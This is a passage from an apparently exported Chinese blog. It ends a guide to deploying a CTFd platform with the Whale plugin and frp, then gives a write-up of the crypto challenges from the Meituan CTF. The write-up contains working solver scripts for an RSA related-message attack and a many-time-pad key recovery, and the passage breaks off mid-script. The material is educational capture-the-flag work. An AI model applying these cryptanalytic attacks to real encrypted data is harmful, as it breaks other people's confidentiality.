http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com -r <span class="variable">$d</span>/requirements.txt; \</span></span><br><span class="line"><span class="bash">      <span class="keyword">fi</span>; \</span></span><br><span class="line"><span class="bash">    <span class="keyword">done</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /opt/CTFd/docker-entrypoint.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> adduser -D -u 1001 -s /bin/sh ctfd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown -R 1001:1001 /opt/CTFd /var/<span class="built_in">log</span>/CTFd /var/uploads</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> <span class="number">1001</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8000</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;/opt/CTFd/docker-entrypoint.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<h3 id="坑2："><a href="#坑2：" class="headerlink" title="坑2："></a>坑2：</h3><p>requirements.txt少装了一个库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">greenlet&#x3D;&#x3D;0.4.15</span><br></pre></td></tr></table></figure>
<h3 id="配置Frp-Token"><a href="#配置Frp-Token" class="headerlink" title="配置Frp Token"></a>配置Frp Token</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim frp/frps.ini</span><br></pre></td></tr></table></figure>
<p> frps.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 6490</span><br><span class="line">token &#x3D; randomme</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim frp&#x2F;frpc.ini</span><br></pre></td></tr></table></figure>
<h3 id="frpc-ini"><a href="#frpc-ini" class="headerlink" title="frpc.ini"></a>frpc.ini</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">token &#x3D; randomme</span><br><span class="line">server_addr &#x3D; 172.1.0.1</span><br><span class="line">server_port &#x3D; 6490</span><br><span class="line">pool_count &#x3D; 200</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">admin_addr &#x3D; 172.1.0.3</span><br><span class="line">admin_port &#x3D; 7400</span><br></pre></td></tr></table></figure>
<h3 id="下载CTFd-Whale插件"><a href="#下载CTFd-Whale插件" class="headerlink" title="下载CTFd-Whale插件"></a>下载CTFd-Whale插件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git submodule update --init  # 初始化CTFd-Whale插件</span><br></pre></td></tr></table></figure>
<h3 id="（可选）修改CTFd平台运行端口"><a href="#（可选）修改CTFd平台运行端口" class="headerlink" title="（可选）修改CTFd平台运行端口"></a>（可选）修改CTFd平台运行端口</h3><p>打开<code>docker-compose.yml</code>，修改CTFd容器的端口信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfd:</span><br><span class="line">    build: .</span><br><span class="line">    user: root</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;80:8000&quot;  # 意为将外部机器的80端口映射至CTFd容器的8000端口，只需修改前者即可</span><br></pre></td></tr></table></figure>
<h3 id="部署容器"><a href="#部署容器" class="headerlink" title="部署容器"></a>部署容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>部署容器，部署完毕后就可以用<code>http://ip:指定的端口</code>访问CTFd进行设置。</p>
<p>参考链接：</p>
<p><a href="https://hujiekang.top/2020/04/26/CTFd-conf/">CTFd平台搭建记录</a></p>
<p><a href="https://www.zhaoj.in/read-6333.html">CTFd-Whale 推荐部署实践</a></p>
<h2 id="配置CTFd-Whale"><a href="#配置CTFd-Whale" class="headerlink" title="配置CTFd-Whale"></a>配置CTFd-Whale</h2><blockquote>
<p>（本次配置中踩的最大的坑）下面提到的所有端口，都需要在<strong>云服务器安全组+系统内防火墙</strong>中开放！！！否则Frp API将无法访问，Frp客户端也无法连接上服务端！！！</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">配置项</th>
<th style="text-align:center">对应值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Docker API URL</td>
<td style="text-align:center">unix://var/run/docker.sock</td>
</tr>
<tr>
<td style="text-align:center">Frp API IP</td>
<td style="text-align:center">172.1.0.3</td>
</tr>
<tr>
<td style="text-align:center">Frp API Port</td>
<td style="text-align:center">7400</td>
</tr>
<tr>
<td style="text-align:center">Frp Http Domain Suffix</td>
<td style="text-align:center">None</td>
</tr>
<tr>
<td style="text-align:center">Frp Http Port</td>
<td style="text-align:center">80</td>
</tr>
<tr>
<td style="text-align:center">Frp Direct IP Address</td>
<td style="text-align:center">填入服务器公网IP</td>
</tr>
<tr>
<td style="text-align:center">Frp Direct Minimum Port</td>
<td style="text-align:center">28000</td>
</tr>
<tr>
<td style="text-align:center">Frp Direct Maximum Port</td>
<td style="text-align:center">容器最大的端口值(28100)</td>
</tr>
<tr>
<td style="text-align:center">Max Container Count</td>
<td style="text-align:center">最大允许容器数量(100)</td>
</tr>
<tr>
<td style="text-align:center">Max Renewal Times</td>
<td style="text-align:center">最大允许更新次数(3)</td>
</tr>
<tr>
<td style="text-align:center">Frp config template</td>
<td style="text-align:center">[common]<br/>token = randomme<br/>server_addr = 172.1.0.1<br/>server_port = 6490<br/>pool_count = 200<br/>tls_enable = true<br/><br/>admin_addr = 172.1.0.3<br/>admin_port = 7400</td>
</tr>
<tr>
<td style="text-align:center">Docker Auto Connect Containers</td>
<td style="text-align:center">ctfd_frpc_1（即docker里面frpc容器的名称）</td>
</tr>
<tr>
<td style="text-align:center">Docker Auto Connect Network</td>
<td style="text-align:center">ctfd_frp_containers（即承载开启的题目容器的网络名称）</td>
</tr>
<tr>
<td style="text-align:center">Docker Dns Setting</td>
<td style="text-align:center">可有可无</td>
</tr>
<tr>
<td style="text-align:center">Docker Swarm Nodes</td>
<td style="text-align:center">填入一开始修改的别名(linux-1)</td>
</tr>
<tr>
<td style="text-align:center">Docker Multi-Container Network Subnet</td>
<td style="text-align:center">173.0.0.0/16</td>
</tr>
<tr>
<td style="text-align:center">Docker Multi-Container Network Subnet New Prefix</td>
<td style="text-align:center">24</td>
</tr>
<tr>
<td style="text-align:center">Docker Container Timeout</td>
<td style="text-align:center">容器的存活时间（单位：秒）(3600)</td>
</tr>
</tbody>
</table>
</div>
<h2 id="配置题目"><a href="#配置题目" class="headerlink" title="配置题目"></a>配置题目</h2><p><img src="https://i.loli.net/2021/07/23/JxSgWGnlwKTpihD.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/07/23/OaUQgY9FWpG7ldx.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/07/23/OaUQgY9FWpG7ldx.png" alt=""></p>
<p><img src="https://i.loli.net/2021/07/23/Ynm2AdB8QlebqCi.png" alt="image-20210723110250464"></p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://www.zhaoj.in/read-6333.html">CTFd-Whale 推荐部署实践</a></p>
<p><a href="https://hujiekang.top/2020/04/26/CTFd-conf/">CTFd平台搭建记录</a></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>CTFd环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Django项目开发参考资料</title>
    <url>/2021/06/15/Django%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="17b99393132b7109a190bf05ffb92ffb7dfc61fb3642fa5b0c0530a8f093f4c2">7ccfaf1f7029b10e37ca00b3f9e0ccb2a13bb745ba77da3fe2b896fe385e6ba734ee173de03bfd955c24f53eae595ddb44399c3c1789d5f7f5a5d2e58eb095e4a14b57bdf22c1feb0949784d9f2c9bd977ae7211782696e985f40aaccbf13dfacea26168b7c7b4619cfb4f83740027c9ed2b83a0f8252b1bc4fb08bd7ef8a53eb6e16c194b5a14dfed5486d67c31e589b27911564939b391734b148ae4dd6eee5789014653302857bddeaa910f26961bde8b7dd7afe6ca096bbad358455f750de96562b978be79dd804783508c96b08d8d2dcbfaaa1ac45419be7ec828356d6f11c3334430498628dd8be7ec6c82fad8b9b389ef606ed9c4486dfbd8e9c857354839f34b2e53b5a8e20ee7e64cb227b0393899cd143a320557a53e0aeb4f72b1dae64bbca77916c1dc5cd6dcc567d03f3bdde3eccd4460543bee2b257bff0726e99efcaea9236c9d57d717c568860e413683c487fa834e97e5096108732e30aac14741e8f3d270e0d618fc96f39eac26b7e4fa8d435913fe49ae682a3f2b7a32550f3a38fcffdd696241a9b638e05b21b3410b2142af3af9293add774efe89e1e38e7defc9ff986e0de148050d1c58c8ea09a96eaa762d73fa6ecf75e1f78131c6624ed57ea31f3433de59b85157699f30c07592cf67a1c702c9dfe1c31b0478907c19b29c78439eb47e2da2885d2858426106316f0223cfdde468d4cba3317f71ff5ecb3daebf64800eaef65d7b4d1bcb11a8ff9690f06ce5c32e4cae576d9032ff796c5ce14fe37055c2150309b5a436a335b0852ee41ea51e1c0358e6ef4f6c01b648986f13ecef80bcad507d8bf7aa0617428ea084cde89e24ed4a215fb97411b8f97630ddffe10ae01eeba789eaf13529e6f41ba0cf46327cdf456a8027232aea82f9a88e7954305a245ecd7b5dcef9d21ac1d37b6efff40eb17346b4a145dd6b8988a03ce45fca828965df9df4b48be45bec47129262cd66515451848ef35e7ab7bb8dac84c432395eac1d12fa5cca76bce9b507d99cb96650fbf15b5b5b576412f3909b35b6953e0536bc9768893a2d25a68adef95d9913766437ab6dd2ef19624cc7353d1b067d686a73e157c62a1434c1243cc425ad3c46d376e23bc2cef057a9cc7ed833c399e91f5016838362236ec63c49557c21d25fd43b83019a010d4e64485c730d0e28361f0a60f2e548329b885b04cfc107ad109594ff372516fef95fb8cbb482c5819f2da341c3eff0ab0bbbc1b9dd30efbdbc7fdcaadc4413f45bfd4d988065c847a74b156c7275be48678a9b91ae235f0151447e60abb9b678eb6ee6f202fe58566b90c48ab18021e6740f87f8cc0b75f8e07384d26671cc4d5b70b8349dee940d20bad0a2b7978bfae85bbed53ca111cc308f47ebc5eb94d04cdc51acb780c6828a7ff9217a41abc6d9bdf71495fdabf58fa4a269d63a84c03df563a78de7622759289229e117cfc474c0596676f40447d09c865a28f4d48398e38afa99eb0948ef4a695eeda94dc1f07ffe513077658a2432aad0ec9d88973d2281ec4677e8910da3b35eda346bb433184be854e3336e6ca2f77d32b735bdac48ff7815a13e94945cacd3548a4c9c0ecf00e257d5de3a014202227f61f5ba15a2984b031511ef526513865861e12f77e1c9949ec6e3b463055dd937dbe096c86bd4ccc784a365ea84a028b50c355f891a764cd9c1952cf4fade28c0bf8d6c0ed88fd3a6ffe8c112f1ba436a1e9afef5201842d3bbce68ed8c508a64f474286e00f3064d6828b6c6704552e1d6b1909fe97ee8e238664062abaf1f0fe473aa6596e7d49878617d77c7938cfb6931bbd5158263648c6a528bdb82d8ace447d894a5023e8c2543e1071acb934496a8953915ee6ed2c36fc6955fca8b4f2a5500b6d51e2e6ec6ef99a2b33b0b7575892319c83610bcb5f4dcb9018f6e506163c33f1e3abb153e3c6a6ca94b8749a11c9ef1e7932188f1d7386217a780fbb0bd721ec42989168f0b98b0d9d44966c2f2935d50b323f88a554526641d70cd1f15828cf032981fc97c8590028e58589dd4c8d25f4101fd76fa583d9d33992cc32fb9a7b2211d4789dc915d359a04dd074bd22155cc22cd8082c3767b30ba3220c9cbb44005c64c1bcb96c05ec4bf2431eb37f1e0bd3fa3115d8d770793877153676106d55434d828bec683ce21e8f3468dd95812e9cf9e097c74cf1beca93e055b130118c108bdfd493d498f182799</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>科创</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>MTCTF密码部分wp</title>
    <url>/2021/05/25/MTCTF%E5%AF%86%E7%A0%81%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h1 id="美团CTF密码部分wp"><a href="#美团CTF密码部分wp" class="headerlink" title="美团CTF密码部分wp"></a>美团CTF密码部分wp</h1><p>比赛的时候做出了easy_RSA，然后random的RSA部分做了一半，可惜不懂pwn模块，没写出nc爆破的脚本。RSAsig在第二天复现即将做出来的时候，平台靶机关了，难受。</p>
<span id="more"></span>
<h2 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h2><p>经典套娃题</p>
<h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">0x9371c61a2b760109781f229d43c6f05b58de65aa2a674ff92334cb5219132448d72c1293c145eb6f35e58791669f2d8d3b6ce506f4b3543beb947cf119f463a00bd33a33c4d566c4fd3f4c73c697fa5f3bf65976284b9cc96ec817241385d480003cdda9649fa0995b013e66f583c9a9710f7e18396fbf461cb31720f94a0f79L</span></span><br><span class="line">e=<span class="number">0x3</span></span><br><span class="line">encrypt(m)=<span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffbbd5a5e1a10f686c3f240e85d011f6c8b968d1d607b2e1d5a78ad6947b7d3ec8f33ad32489befab601fe745164e4ff4aed7630da89af7f902f6a1bf7266c9c95b29f2c69c33b93a709f282d43b10c61b1a1fe76f5fee970780d7512389fd1L</span></span><br><span class="line">encrypt(m+<span class="number">1</span>)=<span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffc5c26b0c12bcff9f697f274f59f0e55a147768332fc1f1bac5bbc8f9bb508104f232bdd20091d26adc52e36feda4a156eae7dce4650f83fabc828fdcfb01d25efb98db8b94811ca855a6aa77caff991e7b986db844ff7a140218449aaa7e8L</span></span><br></pre></td></tr></table></figure>
<h4 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h4><p>原题，一个字不改的，直接上exp了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getM2</span>(<span class="params">a,b,c1,c2,n,e</span>):</span></span><br><span class="line">    a3 = <span class="built_in">pow</span>(a,e,n)</span><br><span class="line">    b3 = <span class="built_in">pow</span>(b,e,n)</span><br><span class="line">    first = c1-a3*c2+<span class="number">2</span>*b3</span><br><span class="line">    first = first % n</span><br><span class="line">    second = e*b*(a3*c2-b3)</span><br><span class="line">    second = second % n</span><br><span class="line">    third = second*inverse(first,n)</span><br><span class="line">    third = third % n</span><br><span class="line">    fourth = (third+b)*inverse(a,n)</span><br><span class="line">    <span class="keyword">return</span> fourth % n</span><br><span class="line">e=<span class="number">0x3</span></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line">b=-<span class="number">1</span></span><br><span class="line">c1=<span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffbbd5a5e1a10f686c3f240e85d011f6c8b968d1d607b2e1d5a78ad6947b7d3ec8f33ad32489befab601fe745164e4ff4aed7630da89af7f902f6a1bf7266c9c95b29f2c69c33b93a709f282d43b10c61b1a1fe76f5fee970780d7512389fd1</span></span><br><span class="line">c2=<span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffc5c26b0c12bcff9f697f274f59f0e55a147768332fc1f1bac5bbc8f9bb508104f232bdd20091d26adc52e36feda4a156eae7dce4650f83fabc828fdcfb01d25efb98db8b94811ca855a6aa77caff991e7b986db844ff7a140218449aaa7e8</span></span><br><span class="line">padding2=<span class="number">1</span></span><br><span class="line">n=<span class="number">0x9371c61a2b760109781f229d43c6f05b58de65aa2a674ff92334cb5219132448d72c1293c145eb6f35e58791669f2d8d3b6ce506f4b3543beb947cf119f463a00bd33a33c4d566c4fd3f4c73c697fa5f3bf65976284b9cc96ec817241385d480003cdda9649fa0995b013e66f583c9a9710f7e18396fbf461cb31720f94a0f79</span></span><br><span class="line">m = getM2(a,b,c1,c2,n,e)-padding2</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>解出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">the key is :everything_is_easy_in_this_question</span><br></pre></td></tr></table></figure>
<p>即为压缩包密码，然后进入第二层</p>
<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p>原理参考：<a href="https://www.anquanke.com/post/id/158944">浅析RSA Padding Attack</a></p>
<p>脚本参考：<a href="https://xz.aliyun.com/t/6459">深入浅出RSA在CTF中的攻击套路</a></p>
<h3 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h3><p>题目给了提示，one_time_cipher，一次一密。额，又是原题，但不完全是。需要修改一下。</p>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">280316470206017f5f163a3460100b111b2c254e103715600f13,</span><br><span class="line">091b0f471d05153811122c70340c0111053a394e0b39500f0a18,</span><br><span class="line">4638080a1e49243e55531a3e23161d411a362e4044111f374409,</span><br><span class="line">0e0d15470206017f59122935601405421d3a244e10371560140f,</span><br><span class="line">031a08080e1a540d62327f242517101d4e2b2807177f13280511,</span><br><span class="line">0a090f001e491d2c111d3024601405431a36231b083e022c1d,</span><br><span class="line">16000406080c543854077f24280144451c2a254e093a0333051a,</span><br><span class="line">02050701120a01334553393f32441d5e1b716027107f19334417,</span><br><span class="line">131f15470800192f5d167f352e0716481e2b29010a7139600c12,</span><br><span class="line">1609411e141c543c501d7f232f0812544e2b2807177f00320b1f,</span><br><span class="line">0a090c470a1c1d3c5a1f2670210a0011093a344e103715600712,</span><br><span class="line">141e04040f49153142043a22601711520d3a331d0826</span><br></pre></td></tr></table></figure>
<h4 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h4><p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class="line"><span class="comment"># @author intrd - http://dann.com.br/ </span></span><br><span class="line"><span class="comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="string">"280316470206017f5f163a3460100b111b2c254e103715600f13"</span></span><br><span class="line">c2 = <span class="string">"091b0f471d05153811122c70340c0111053a394e0b39500f0a18"</span></span><br><span class="line">c3 = <span class="string">"4638080a1e49243e55531a3e23161d411a362e4044111f374409"</span></span><br><span class="line">c4 = <span class="string">"0e0d15470206017f59122935601405421d3a244e10371560140f"</span></span><br><span class="line">c5 = <span class="string">"031a08080e1a540d62327f242517101d4e2b2807177f13280511"</span></span><br><span class="line">c6 = <span class="string">"0a090f001e491d2c111d3024601405431a36231b083e022c1d"</span></span><br><span class="line">c7 = <span class="string">"16000406080c543854077f24280144451c2a254e093a0333051a"</span></span><br><span class="line">c8 = <span class="string">"02050701120a01334553393f32441d5e1b716027107f19334417"</span></span><br><span class="line">c9 = <span class="string">"131f15470800192f5d167f352e0716481e2b29010a7139600c12"</span></span><br><span class="line">c10 = <span class="string">"1609411e141c543c501d7f232f0812544e2b2807177f00320b1f"</span></span><br><span class="line">c11 = <span class="string">"0a090c470a1c1d3c5a1f2670210a0011093a344e103715600712"</span></span><br><span class="line">ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]</span><br><span class="line"><span class="comment"># The target ciphertext we want to crack</span></span><br><span class="line">target_cipher = <span class="string">"141e04040f49153142043a22601711520d3a331d0826"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XORs two string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span>(<span class="params">a, b</span>):</span>     <span class="comment"># xor two strings (trims the longer input)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># To store the final key</span></span><br><span class="line">final_key = [<span class="literal">None</span>]*<span class="number">150</span></span><br><span class="line"><span class="comment"># To store the positions we know are broken</span></span><br><span class="line">known_key_positions = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># For each ciphertext</span></span><br><span class="line"><span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">	counter = collections.Counter()</span><br><span class="line">	<span class="comment"># for each other ciphertext</span></span><br><span class="line">	<span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">		<span class="keyword">if</span> current_index != index: <span class="comment"># don't xor a ciphertext with itself</span></span><br><span class="line">			<span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(strxor(ciphertext.decode(<span class="string">'hex'</span>), ciphertext2.decode(<span class="string">'hex'</span>))): <span class="comment"># Xor the two ciphertexts</span></span><br><span class="line">				<span class="comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)</span></span><br><span class="line">				<span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span> <span class="comment"># Increment the counter at this index</span></span><br><span class="line">	knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class="line">	<span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">		<span class="comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class="line">		<span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line">	<span class="comment">#print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class="line">	xor_with_spaces = strxor(ciphertext.decode(<span class="string">'hex'</span>),<span class="string">' '</span>*<span class="number">150</span>)</span><br><span class="line">	<span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">		<span class="comment"># Store the key's value at the correct position</span></span><br><span class="line">		final_key[index] = xor_with_spaces[index].encode(<span class="string">'hex'</span>)</span><br><span class="line">		<span class="comment"># Record that we known the key at this position</span></span><br><span class="line">		known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)</span></span><br><span class="line">final_key_hex = <span class="string">''</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">'00'</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line"><span class="comment"># Xor the currently known key with the target cipher</span></span><br><span class="line">output = strxor(target_cipher.decode(<span class="string">'hex'</span>),final_key_hex.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"Fix this sentence:"</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">''</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">'*'</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(output)])+<span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WAIT.. MANUAL STEP HERE </span></span><br><span class="line"><span class="comment"># This output are printing a * if that character is not known yet</span></span><br><span class="line"><span class="comment"># fix the missing characters like this: "Let*M**k*ow if *o{*a" = "cure, Let Me know if you a"</span></span><br><span class="line"><span class="comment"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class="line"><span class="comment"># and we have our key to fix the entire text!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sys.exit(0) #comment and continue if u got a good key</span></span><br><span class="line">list1=<span class="string">' abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line"></span><br><span class="line">			target_plaintext = <span class="string">"r{0}e{1}{2} answer successly"</span>.<span class="built_in">format</span>(list1[i],list1[j],list1[k])</span><br><span class="line"><span class="comment"># print "Fixed:"</span></span><br><span class="line"><span class="comment"># print target_plaintext+"\n"</span></span><br><span class="line"></span><br><span class="line">			key = strxor(target_cipher.decode(<span class="string">'hex'</span>),target_plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print "Decrypted msg:"</span></span><br><span class="line"><span class="comment">#for cipher in ciphers:</span></span><br><span class="line"><span class="comment">#	print strxor(cipher.decode('hex'),key)</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">'flag{'</span> <span class="keyword">in</span> key:</span><br><span class="line">				<span class="built_in">print</span> target_plaintext</span><br><span class="line">				<span class="built_in">print</span> <span class="string">"\nPrivate key recovered: "</span>+key+<span class="string">"\n"</span></span><br><span class="line">				<span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">					<span class="built_in">print</span> strxor(cipher.decode(<span class="string">'hex'</span>),key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print "Fixed:"</span></span><br><span class="line"><span class="comment"># print target_plaintext+"\n"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># key = strxor(target_cipher.decode('hex'),target_plaintext)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print "Decrypted msg:"</span></span><br><span class="line"><span class="comment"># for cipher in ciphers:</span></span><br><span class="line"><span class="comment"># 	print strxor(cipher.decode('hex'),key)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print "\nPrivate key recovered: "+key+"\n"</span></span><br></pre></td></tr></table></figure>
<p>得到的密文为<code>r*e** answer succks*ly</code></p>
<p>爆破恢复+猜测后，得到实际密文:<code>rrect answer successly</code></p>
<p>明文段落：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Now you need to use th</span><br><span class="line">own flag as the key of</span><br><span class="line"> Time Pad Encryptin. N</span><br><span class="line">hat you have passed th</span><br><span class="line">evious RSA test, this </span><br><span class="line">lenge is not particula</span><br><span class="line">please get the true me</span><br><span class="line">difficult for you. It </span><br><span class="line">ust simple encryption.</span><br><span class="line">pe you can solve this </span><br><span class="line">lem quickly and get th</span><br><span class="line">rrect answer successly</span><br></pre></td></tr></table></figure>
<p>得到flag：<code>flag{it_1s_P@dd1n_@nd_</code>好恶心啊，缺了几个字符。</p>
<p>仔细看明文出来的，缺了字母，恶心坏了。</p>
<p>缺了4个字节，最后一个字节肯定是<code>}</code>，复原第八行明文后异或爆破前三位，得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_bytes</span>(<span class="params">key_stream, message</span>):</span></span><br><span class="line">    length = <span class="built_in">min</span>(<span class="built_in">len</span>(key_stream), <span class="built_in">len</span>(message))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([key_stream[i]^ message[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length)])</span><br><span class="line"> </span><br><span class="line">message = <span class="string">b"difficult for you. It is j"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span 